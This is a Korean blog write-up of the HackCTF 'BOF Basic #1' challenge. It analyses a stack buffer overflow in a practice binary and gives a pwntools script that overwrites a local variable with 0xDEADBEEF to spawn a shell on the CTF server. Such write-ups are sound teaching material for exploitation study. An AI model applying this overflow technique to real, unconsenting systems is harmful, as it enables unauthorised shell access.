---
title:  "[HackCTF] BOF Basic #1 풀이"
categories:
    - Pwnable
tags:
    - ctf.j0n9hyun.xyz
toc: true
published: true
---
[HackCTF] BOF Basic #1 풀이

# Environments

|Name|Config|
|:---:|:---|
|CPU|Apple M1|
|Architecture|ARM64|
|OS|Microsoft Windows 11 on ARM|
|Tools|- gdb-peda<br/>- Hex-Rays IDA 7.5|

# Problem
![](/assets/HCTF/bof_basic-0.png)
```
Get Input Buffer
Print You are on the right way! 또는 eah dude! You win!
```

요약: `bof_basic`, `nc ctf.j0n9hyun.xyz 3000` 으로부터 flag 찾기

# File Format
![](/assets/HCTF/bof_basic-1.png)

![](/assets/HCTF/bof_basic-2.png)

> x86 ELF LSB Executable, Not Stripped, Not UPX Packed

# checksec

|Name|Status|
|:---:|:---|
|CANARY|disabled|
|FORTIFY|disabled
|NX|ENABLED|
|PIE|disabled|
|RELRO|Partial|

- Can overwrite GOT

# 풀이
![](/assets/HCTF/bof_basic-3.png)

우선 Function 정보를 `info func`를 통해 확인 함. system func call 이 이루어지므로 해당 func을 호출하는 것을 목표로 정함.

![](/assets/HCTF/bof_basic-4.png)

main func를 우선 분석 살펴봄. `fgets`로 String 입려 받고, `0xdeadbeef` 와 `cmp` (Compare) 와 `jne` (Jump Not Equal)로 값 비교 후 일치 하지 않는 경우 `0x804857c`로 Jump 한다. 그렇다면 값이 Equal 하다면 순차적으로 진행된다는 뜻.

![](/assets/HCTF/bof_basic-5.png)

IDA를 통해 Static Analysis 시도. `jne` 할 경우 (10번째 행) "You are on the right way!" 라는 메시지가 반겨줌.

또한 `cmp` 대상인 0xDEADBEEF 확인. 따라서 입력 값을 0xDEADBEEF 로 설정할 경우 `system("/bin/bash");` 를 호출 가능

3번째 행으로부터 char 형 배열 s를 40의 길이로 선언한 것 확인. 메모리 주소가 [esp+4]. 사용자로부터 입력 받는 값인 int 형 v5의 경우 메모리 주소가 [esp+44]. 하지만 7행을 보자면 fgets를 통해 최대 문자열 길이를 45까지 입력이 가능 한 것을 확인 가능.

이를 이용해 s를 40 바이트로 채우고 BOF시켜 뒤에 `0xDEADBEEF` 를 넣을 경우 v5가 `0xDEADBEEF` 로 Overwrite.

# Exploit Scenario
```
# p32: 4 Byte packing
payload = "Z" * 40 + p32(0xDEADBEEF)
```

# Exploit Code
```
from pwn import *
context.log_level = DEBUG # set log level to debug

p = remote("ctf.j0n9hyun.xyz", 3000)
payload = "Z" * 40 + p32(0xDEADBEEF)

p.sendline(payload) # send payload to p
p.interactive() # Prevent closing shell
```

# Result
![](/assets/HCTF/bof_basic-6.png)